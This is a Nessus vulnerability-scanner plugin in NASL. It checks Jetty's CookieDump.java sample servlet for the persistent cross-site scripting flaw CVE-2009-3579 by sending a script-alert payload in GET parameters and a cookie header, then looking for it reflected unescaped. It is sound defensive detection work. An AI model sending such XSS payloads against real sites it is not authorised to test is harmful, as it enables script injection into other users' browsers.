#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42797);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_cve_id("CVE-2009-3579");
  script_osvdb_id(58883);

  script_name(english:"Jetty CookieDump.java Sample Application Persistent XSS");
  script_summary(english:"Tries to inject script code through 'Value' parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that is prone to a cross-
site scripting attack."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The installed version of Mort Bay Jetty includes a sample web
application, 'CookieDump.java', that allows for setting arbitrary
cookies through user input to the 'Name' and 'Value' GET parameters
to '/cookie' and in turn uses those without sanitizing them to 
generate dynamic HTML output.

An attacker may be able to leverage this issue to inject arbitrary
HTML and script code into a user's browser to be executed within the
security context of the affected site."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.coresecurity.com/content/jetty-persistent-xss"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/507013/30/0/threaded"
  );
  script_set_attribute(
    attribute:"solution", 
    value:
"Upgrade to Mort Bay Jetty 7.0.0 or later as that reportedly
addresses the issue."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/10/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mortbay:jetty");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:8080);


# Unless we're paranoid, make sure the banner looks like Mort Bay Jetty.
#
# nb: the Server Response header can be suppressed; eg, see
#     <http://docs.codehaus.org/display/JETTY/How+to+suppress+the+Server+HTTP+header>.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (banner && "Server: Jetty(" >!< banner) exit(0);
}


# Try to exploit the issue.
init_cookiejar();

alert = string("<script>alert('", SCRIPT_NAME, "')</script>");

cookie_name = "NESSUS";
cookie_value = alert;

url = string(
  "/cookie/?",
  "Name=", cookie_name, "&",
  "Value=", urlencode(str:cookie_value), "&",
  "Age=", rand()%1000
);

req = http_mk_get_req(
  port        : port,
  item        : url, 
  add_headers : make_array("Cookie", "NESSUS="+alert)
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if ("h1>Cookie Dump Servlet:" >!< res[2]) 
  exit(0, "The response from the web server on port "+port+" does not appear to be from CookieDump.java.");


hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(hdrs['set-cookie'])) new_cookie = "";
else new_cookie = hdrs['set-cookie'];


# There's a problem if...
if (
  # we can set arbitrary cookies and...
  string(cookie_name, "=", cookie_value) >< new_cookie &&
  # our exploit appears in the response
  string(cookie_name, "</b>=", cookie_value) >< res[2]
)
{
 if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus was able to verify the vulnerability using the following\n",
      "request :\n",
      "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
      http_mk_buffer_from_req(req:req), "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  exit(0);
}
else exit(0, "The host is not affected.");
